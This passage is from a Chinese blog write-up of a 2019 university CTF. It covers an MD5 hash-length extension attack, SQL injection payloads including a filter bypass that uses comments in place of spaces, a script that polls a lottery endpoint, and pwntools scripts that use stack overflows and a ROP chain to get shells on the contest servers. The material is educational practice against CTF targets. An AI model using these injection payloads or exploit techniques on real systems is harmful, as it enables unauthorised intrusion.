    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"check"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token punctuation">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token punctuation">.</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Login successful.\n"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"The flag is "</span><span class="token punctuation">.</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"Wrong Cookies. Get out!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"Admins only"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 这里得到的 MD5 是 f7fa8882c893a3f48f3cecdaa2f52102，固定不变</span>
<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ahash"</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token punctuation">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span> <span class="token punctuation">.</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del>目标是找到 <code>$username</code> 和 <code>$password</code>，符合以下要求：</del></p><ul><li><del><code>urldecode($username) === &quot;admin&quot;</code></del></li><li><del><code>urldecode($password) != &quot;admin&quot;</code></del></li><li><del><code>urldecode($username . $password) === &quot;adminadmin&quot;</code></del></li></ul><p>↑不存在的（doge）</p><p>找了一下，关键词是“MD5 的 HASH 扩展攻击”。参见：<a href="https://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">https://www.cnblogs.com/pcat/p/5478509.html</a></p><p>所以就去虚拟机装上 <code>hashpump</code>，然后设置 Cookie 为生成的 MD5，设置 <code>password</code> 为另外那一堆很长的值，然后就可以得到 <code>flag&#123;G_du93ksy639_sjd&#125;</code>。</p><pre class="line-numbers language-plaintext" data-language="plaintext"><code class="language-plaintext">root@kali:~# hashpump
Input Signature: f7fa8882c893a3f48f3cecdaa2f52102
Input Data: admin
Input Key Length: 15
Input Data to Add: yuruyuri
357ea255861079bcbcdff9035290e554
admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00yuruyuri<span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img data-src="https://ae01.alicdn.com/kf/U619df79cacdd4579b24ce862f1b1675cu.png" data-src-webp="https://ae01.alicdn.com/kf/Hcc8cc92b2d3e4895be9a9c9b45e78a514.jpg"> <img data-src="https://ae01.alicdn.com/kf/U8bdcbcc1d84a4d96a3cf3c1bab2980b0S.png" data-src-webp="https://ae01.alicdn.com/kf/H5f5bb0a079714f08902bd54136f64d650.jpg"><h2 id="Babysql"><a href="#Babysql" class="headerlink" title="Babysql"></a>Babysql</h2><img data-src="https://ae01.alicdn.com/kf/U9bdb510bc2f44d2dae6582411b0b8d237.png" data-src-webp="https://ae01.alicdn.com/kf/Hc75de0f8d0c54d9aa0ef5c66f225a5d5A.jpg"><p>其实用 <code>UNION</code> 直接注入就可以了，一开始就想到了这个，不过因为没有语句闭合所以很久都没做出来……输入 <code>-1&#39; UNION SELECT flag,flag,flag FROM flag#</code> 就可以得到 <code>flag&#123;Hh_N1c3_1&#125;</code>。</p><p>“语句闭合”指的是碰到 <code>... WHERE id = &#39;***</code> 这种语句，将 *** 设为 <code>1&#39; UNION ...</code> 而不是 <code>1</code>，组合后的语句就是 <code>... WHERE id = &#39;1&#39; UNION ...</code> 而不是 <code>WHERE id = &#39;1 UNION ...</code>，后者显然是有问题的。</p><p>不过按照题目上的源代码，不闭合不注释输入 <code>-1 UNION SELECT flag,flag,flag FROM flag</code> 构成 <code>SELECT * FROM users where id=-1 UNION SELECT flag,flag,flag FROM flag</code> 应该也是没问题的，但是实际上必须要有闭合和注释，也许是题目的代码给错了……？</p><p>SQL 语句中有某些单词的话，就会直接返回“hacker!”，这是为了防止删库跑路吧 233</p><h2 id="SELECT-me-Easysql"><a href="#SELECT-me-Easysql" class="headerlink" title="SELECT_me! Easysql"></a><del>SELECT_me!</del> Easysql</h2><p><del>官方改名，果然是续作</del></p><img data-src="https://ae01.alicdn.com/kf/Ue2103291212343c28ba9be0eaa9399a5o.png" data-src-webp="https://ae01.alicdn.com/kf/H942ba2578cad424692d911f39fb153b9K.jpg"><p>上一题的<strong>续作</strong>，这次就算只输入一个空格也会出现“hacker!”，解决方法是用注释 <code>/**/</code> 替代空格：<code>-1&#39;/**/UNION/**/SELECT/**/flag,flag,flag/**/FROM/**/flag#</code>，然后得到 <code>flag&#123;u_c4ught_me&#125;</code>。</p><h2 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h2><p><del>中途加入的送分题，娱乐题</del></p><p><del>经过测试，中奖率大概是 0.04%</del></p><img data-src="https://ae01.alicdn.com/kf/Uc7b2dcda5d0e4bcfaf0c004f57b1599fE.png" data-src-webp="https://ae01.alicdn.com/kf/H76d7dc74c1c74843af81daa176127cb4h.jpg"><p>注意：大转盘上的“flag”字样写反了（滑稽</p><p>一次一次地抽奖就算了，还得看转盘转转转，浪费时间，不如直接看源代码。每次抽奖时会从 <code>http://35.194.143.125:4522/data.php</code> 获取抽奖结果，返回类似于以下格式的 JSON 数据：</p><pre class="line-numbers language-plaintext" data-language="plaintext"><code class="language-plaintext">&#123;
    &quot;angle&quot;:306,
    &quot;prize&quot;:&quot;四等奖&quot;,
    &quot;flag&quot;:&quot;你看看你，看看你，成天就想要flag!&quot;
&#125;<span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意大转盘上的 flag 部分在 150-210 度的范围内，所以可以自动抽奖（滑稽），一直到角度在 150-210 为止。</p><p>下面的抽奖脚本使用 PowerShell 实现（懒得再去查怎么用 Python 访问 URL 和解析 JSON 了）：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">$true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$Request</span> = <span class="token function">Invoke-RestMethod</span> <span class="token string">'http://35.194.143.125:4522/data.php'</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Request</span><span class="token punctuation">.</span>angle <span class="token operator">-ge</span> 150 <span class="token operator">-and</span> <span class="token variable">$Request</span><span class="token punctuation">.</span>angle <span class="token operator">-le</span> 210<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">Write-Host</span> <span class="token variable">$Request</span><span class="token punctuation">.</span>flag
        <span class="token keyword">break</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img data-src="https://ae01.alicdn.com/kf/Hb1db1533871248bf94e3d334a6023847U.jpg" data-src-webp="https://ae01.alicdn.com/kf/Hcf1eb2207b954b6c970f151e2124fa5aQ.jpg"><p>最后得到 <code>flag&#123;You_are_really_the_European_emperor!!!&#125;</code>。</p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="babyrip"><a href="#babyrip" class="headerlink" title="babyrip"></a>babyrip</h2><img data-src="https://ae01.alicdn.com/kf/Ue6c17547c0cc4bc99312947143b464f9j.png" data-src-webp="https://ae01.alicdn.com/kf/H2b9c26b5b9974848b20608f3e8be7e89E.jpg"><p>之前没做过 pwn，这次为了拿分不得不开始踩坑……</p><p><code>v1</code> 存在栈溢出，左边有个 <code>backd00r</code> 函数（地址 <code>0x4007D5</code>）可以得到 Shell。</p><img data-src="https://ae01.alicdn.com/kf/Uf214f097ba1848a6adffa114eda172585.png" data-src-webp="https://ae01.alicdn.com/kf/H13a2cfb12c204ccbbf97741ded2c616fi.jpg"><p><code>v1</code> 的栈的长度被<del>钦定硬点</del>为 <code>0xF0</code>，按照 IDA 这边的提示，下面还有 <code>0x08</code> 的 s，然后就是返回地址 r，目标是要把这个 r 给强行覆盖成 <code>backd00r</code>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'34.80.207.78'</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0xF8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4007D5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img data-src="https://ae01.alicdn.com/kf/Uf96d0adb51f14f20af0fba2d24782941Q.png" data-src-webp="https://ae01.alicdn.com/kf/He0f4d7f1ac294f979ca89a3c18cbc9c0C.jpg"><p><code>flag&#123;9af42a36-72cd-43c5-be0f-aae3aebbad&#125;</code></p><h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><p>做这题的时候大量参考了 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" target="_blank" rel="noopener">CTF Wiki 上的 ROP 教程</a>，不过因为没有专门学过汇编，对 ROP 还是很难理解啊……</p><img data-src="https://ae01.alicdn.com/kf/U0bcb5df2240847c8b300574d4fcbfef1L.png" data-src-webp="https://ae01.alicdn.com/kf/H421fbf9aff334acdb4031104292204deM.jpg"><p>用 <code>checksec</code> 看一下，因为加了栈不可执行保护（NX），所以上一道题的方法不管用了。而且虽然有个 <code>backdoor</code> 函数，不过那里写的是 <code>system(&quot;echo FLAG&quot;)</code>，是个<strong>假后门</strong>。</p><img data-src="https://ae01.alicdn.com/kf/He2215e46bbf54e43b5c17ad9b63fe850P.png" data-src-webp="https://ae01.alicdn.com/kf/H82ee9b7a3507466485609b0eca7f667dQ.jpg"><p><code>echo FLAG</code> 的地址被传进了 edi（或者是 rdi？），<del>在艰苦地查阅了大量的资料后</del>，得到的结论是应该构造 ROP 链 <code>pop rdi, ret</code>（地址 <code>0x400803</code>），然后把这个 <code>echo FLAG</code> 换成 <code>/bin/sh</code>（地址 <code>0x400836</code>）。</p><img data-src="https://ae01.alicdn.com/kf/U6702c81a16264e0bb8ed099da917dd5al.png" data-src-webp="https://ae01.alicdn.com/kf/H95bdb15fdc994d8386f07cd89e843b25s.jpg"><p><code>flag&#123;b94b8c51-c3c3-45fd-8cad-52e0ef894&#125;</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'34.80.207.78'</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">''</span>
payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0xF8</span> <span class="token comment"># 栈溢出</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400803</span><span class="token punctuation">)</span> <span class="token comment"># ROP 链</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400836</span><span class="token punctuation">)</span> <span class="token comment"># 取 /bin/sh 字符串</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400724</span><span class="token punctuation">)</span> <span class="token comment"># 跳转到 call _system 获取 shell</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img data-src="https://ae01.alicdn.com/kf/U2fa02d99f25e46ada662e7613230db87q.png" data-src-webp="https://ae01.alicdn.com/kf/H98f82e3235ce43f9bf5903e0624e7f47T.jpg"><h2 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h2><p>只要会了 babyrip，就不难理解这题了| ू•ૅω•́)ᵎᵎᵎ</p><img data-src="https://ae01.alicdn.com/kf/U4c9463eeb89a43f6b2b4b1652cee31269.png" data-src-webp="https://ae01.alicdn.com/kf/H7b80555274d24523a6d952e8a48ec191i.jpg"><p>把 <code>v3</code> 的值弄成 <code>0x1337ABC</code>，就可以马上拿到 Shell。之前的 babyrip 是通过溢出强行把函数的<strong>返回地址</strong>改为 Shell，这次就是要修改<strong>变量的值</strong>了。<code>v3</code> 在栈中的存储紧跟在 <code>v2</code> 后面，所以只要在输入 <code>v2</code> 时使用溢出就可以强行修改 <code>v3</code> 的值。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'34.80.207.78'</span><span class="token punctuation">,</span> <span class="token number">10002</span><span class="token punctuation">)</span>
<span class="token comment"># 第一次输入保存到 s，不重要</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
<span class="token comment"># 第二次输入保存到 v2，此时可以使用栈溢出覆盖 v3 的值</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0xF8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1337ABC</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img data-src="https://ae01.alicdn.com/kf/U90519bc277a64b288a083e40d68c3daao.png" data-src-webp="https://ae01.alicdn.com/kf/Hc639609d605d48eb89aec1b7351ebe558.jpg"><p><code>flag&#123;eb715228-7d01-45e6-8208-8bb9275f73d3&#125;</code></p><hr><p>最后是个彩蛋( ﾟ∀。)</p><p>在比赛结束的前几个小时，由那位传说级菊苣带头，大家一起改起了自己的 ID，排行榜上充满了快活的空气。</p><img data-src="https://ae01.alicdn.com/kf/H9fa595bea07f49fab7852ea9264a65b2g.jpg" data-src-webp="https://ae01.alicdn.com/kf/H7443a9c8724a4687af3c610203a70e97G.jpg"><p>遗憾的是，到了晚上，管理员将这些 ID 全部都改成了参赛者的姓和“XX”，例如“曾XX”、“张XX”之类的。于是整个排行榜突然从聊天室变成了<del>枪毙名单</del>。</p><p>（当时没有截图，大家自己脑补吧┐(´-｀)┌）</p><hr><p>写完这篇 Write-Up 之后没多久，在朋友圈看到了（另一位）某君吐槽自己熬夜做题还被菊苣们吊打终于到周末可以回血了，然后发了一张排行榜截图和八张与女票一起出去玩的合照。</p><p><code>flag&#123;1_h4v3_a_g1rlfri3nd&#125;</code>，这题的价值远远不止 500 分，我还是输了( ・_ゝ・)</p><img data-src="https://ae01.alicdn.com/kf/U5914843156ac418480b159ca4d2b7c16j.png" data-src-webp="https://ae01.alicdn.com/kf/U5f0c851d7447457faee9752d3768ddcbK.jpg"><blockquote class="mdui-m-b-0 mdui-m-x-0 mdui-p-y-1" style="border-left:4px solid rgba(0,0,0,.36)"><strong>本作品采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>进行许可。</strong><br><strong>本文作者：✨小透明・宸✨</strong><br><strong>本文链接：<a href="https://akarin.dev/2019/11/16/2019-jnu-ctf-writeup/">https://akarin.dev/2019/11/16/2019-jnu-ctf-writeup/</a></strong></blockquote></article><div class="mdui-p-a-3 mdui-color-white" id="lv-container" data-id="city" data-uid="MTAyMC80NDUwOC8yMTAzOQ=="><script>(()=>{const e=document.createElement("script");e.src="https://cdn-city.livere.com/js/embed.dist.js",e.async=!0,document.body.appendChild(e)})()</script></div></div><div class="mdui-valign mdui-m-t-2"><a href="../../23/powershell-waifu2xgif/" class="mdui-ripple mdui-btn mdui-btn-icon"><i class="material-icons mdui-icon">chevron_left</i> </a><span class="mdui-typo-body-1-opacity mdui-text-left mdui-m-l-1" title="使用 waifu2x-caffe 和 ImageMagick 放大 GIF 动图">上一篇</span> <span class="mdui-typo-body-1-opacity mdui-text-center" style="flex-grow:1"></span> <span class="mdui-typo-body-1-opacity mdui-text-right mdui-m-r-1" title="“存在感消失的地方|ω•`)”已经开始使用 WebP 图片啦！">下一篇</span> <a href="../../../10/22/upgrade-to-webp/" class="mdui-ripple mdui-btn mdui-btn-icon"><i class="material-icons mdui-icon">chevron_right</i></a></div></main><footer class="mdui-container mdui-m-y-5 mdui-typo" style="display:flex;max-width:1024px"><div class="mdui-typo-body-1-opacity mdui-text-left">Copyright © 2021 ✨小透明・宸✨<br>Hosted by <a href="https://github.com/TransparentLC/transparentlc.github.io" target="_blank">Github Pages</a></div><div style="flex-grow:1"></div><div class="mdui-typo-body-1-opacity mdui-text-right">Powered by <a href="https://hexo.io" target="_blank">Hexo</a> <span class="mdui-hidden-xs-down">5.4.0</span><br>Theme - <a href="https://github.com/TransparentLC/hexo-theme-akarin" target="_blank">Akarin</a></div></footer><script src="https://cdn.jsdelivr.net/combine/npm/aplayer@1/dist/APlayer.min.js,gh/TransparentLC/transparentlc.github.io/js/mdui.min.js,npm/medium-zoom@1/dist/medium-zoom.min.js,npm/instant.page@5/instantpage.min.js,gh/TransparentLC/transparentlc.github.io/js/script.min.js"></script><script src="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/js/bsz.min.js" async></script><script>window.MathJax={tex:{inlineMath:[["$","$"],["(",")"]],processEscapes:!0},options:{ignoreHtmlClass:"tex2jax_ignore|dno",skipHtmlTags:["script","noscript","style","textarea","pre","code"]}}</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async></script><script>/MicroMessenger/.test(navigator.userAgent)&&(()=>{const e=document.createElement("script");e.src="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/js/fuck-wechat.min.js",document.body.appendChild(e)})()</script></body></html>